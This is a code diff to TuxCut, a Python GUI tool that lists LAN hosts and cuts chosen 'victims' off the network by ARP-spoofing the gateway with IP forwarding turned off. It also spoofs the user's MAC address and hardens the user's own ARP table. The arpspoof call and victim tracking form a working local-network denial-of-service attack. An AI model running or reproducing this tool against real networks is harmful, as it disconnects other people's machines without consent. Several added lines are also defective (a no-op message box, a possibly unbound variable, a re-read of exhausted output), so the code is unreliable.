@@ -13,7 +13,8 @@ class TuxCut(QtGui.QMainWindow):
 		self._gwMAC=None
 		self._iface =None
 		self._isProtected = False
-		self._isFedora = True
+		self._isFedora = False
+		self.check_fedora()
 		self._isQuit = False
 		self._cutted_hosts = {}
 		
@@ -22,10 +23,11 @@ class TuxCut(QtGui.QMainWindow):
 		self._my_mac = self.get_mymac()
 		self.lbl_mac.setText(self._my_mac)
 		
-		self.enable_protection()
-		self.list_hosts(self._gwIP)
-		
-		self.resume_all()
+		if not self._gwMAC==None:
+			self.enable_protection()
+			self.list_hosts(self._gwIP)
+		else:
+			QtGui.QMessageBox
 		self.show_Window()
 		
 		
@@ -69,6 +71,12 @@ class TuxCut(QtGui.QMainWindow):
 		else:
 			self.close()
 
+	def check_fedora(self):
+		if os.path.exists('/etc/redhat-release'):
+			self._isFedora = True
+		else:
+			self._isFedora = False
+			
 	def default_gw(self):
 		args = ['route','list']
 		gwip = sp.Popen(['ip','route','list'],stdout = sp.PIPE)
@@ -82,6 +90,7 @@ class TuxCut(QtGui.QMainWindow):
 	def gw_mac(self,gwip):
 		arping = sp.Popen(['arp-scan','--interface',self._iface,self._gwIP],stdout = sp.PIPE)
 		for line in arping.stdout:
+
 			if line.startswith(self._gwIP.split('.')[0]):
 				return line.split()[1]
 	
@@ -89,7 +98,15 @@ class TuxCut(QtGui.QMainWindow):
 		proc = sp.Popen(['ifconfig',self._iface],stdout = sp.PIPE)
 		for line in proc.stdout:
 			if line.startswith('        ether'):
-				return line.split()[1]
+				MAC =  line.split()[1]
+				
+		if not MAC==None:
+			return MAC
+		else:
+			for line in proc.stdout:
+				if line.startswith(self._iface):
+					return line.split()[4]
+				
 				
 	def list_hosts(self, ip):
 		if self._isProtected:
@@ -102,7 +119,6 @@ class TuxCut(QtGui.QMainWindow):
 		i=1
 		for line in arping.stdout:
 			if line.startswith(ip.split('.')[0]):
-				print line.split()
 				ip = line.split()[0]
 				mac= line.split()[1]
 				self.table_hosts.setRowCount(i)
@@ -114,15 +130,25 @@ class TuxCut(QtGui.QMainWindow):
 
 	def enable_protection(self):    
 		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		sp.Popen(['arptables','-P','IN','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		sp.Popen(['arptables','-P','OUTPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		sp.Popen(['arptables','-A','IN','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		sp.Popen(['arptables','-A','OUT','-d',self._gwIP,'--target-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		if self._isFedora:
+			print "This is a RedHat based distro"
+			sp.Popen(['arptables','-P','IN','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			sp.Popen(['arptables','-P','OUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			sp.Popen(['arptables','-A','IN','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			sp.Popen(['arptables','-A','OUT','-d',self._gwIP,'--target-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		else:
+			print "This is not a RedHat based distro"
+			sp.Popen(['arptables','-P','INPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			sp.Popen(['arptables','-P','OUTPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			sp.Popen(['arptables','-A','INPUT','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			sp.Popen(['arptables','-A','OUTPUT','-d',self._gwIP,'--destination-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		
 		sp.Popen(['arp','-s',self._gwIP,self._gwMAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		
 		self._isProtected = True
 		if not self.cbox_protection.isChecked():
 			self.cbox_protection.setCheckState(QtCore.Qt.Checked)
+			
 		
 	def disable_protection(self):
 		sp.Popen(['arptables','-P','IN','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
@@ -135,7 +161,6 @@ class TuxCut(QtGui.QMainWindow):
 		proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		print self._iface
 		### Start Arpspoofing the victim
-		#os.system("arpspoof -i " + self.icard + " -t " + self.gwip + " " + vicip + " & > /dev/null")
 		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		#self._cutted_hosts.setdefault(victim_IP,proc.pid)
 		self._cutted_hosts[victim_IP]=proc.pid
@@ -147,11 +172,12 @@ class TuxCut(QtGui.QMainWindow):
 		sp.Popen(['killall','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		
 		
-	def resume_single_host(self,victim_IP):
+	def resume_single_host(self,victim_IP,row):
 		if self._cutted_hosts.has_key(victim_IP):
 			pid = self._cutted_hosts[victim_IP]
 			print "resuming >>>> ",pid
 			os.kill(pid,9)
+			self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
 			del self._cutted_hosts[victim_IP]
 			print self._cutted_hosts
 		else:
@@ -164,7 +190,7 @@ class TuxCut(QtGui.QMainWindow):
 													random.randint(0x00, 0x7f),
 													random.randint(0x00, 0xff),
 													random.randint(0x00, 0xff)]))
-		print new_MAC
+		print 'Your new MAC is : ',new_MAC
 		self.lbl_mac.setText(new_MAC)
 		sp.Popen(['ifconfig',self._iface,'down','hw','ether',new_MAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		sp.Popen(['ifconfig',self._iface,'up'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
@@ -189,7 +215,7 @@ class TuxCut(QtGui.QMainWindow):
 		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
 		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
 		if not victim_IP==None:
-			self.resume_single_host(victim_IP)
+			self.resume_single_host(victim_IP,selectedRow)
 		
 	def on_quit_triggered(self):
 		self._isQuit = True
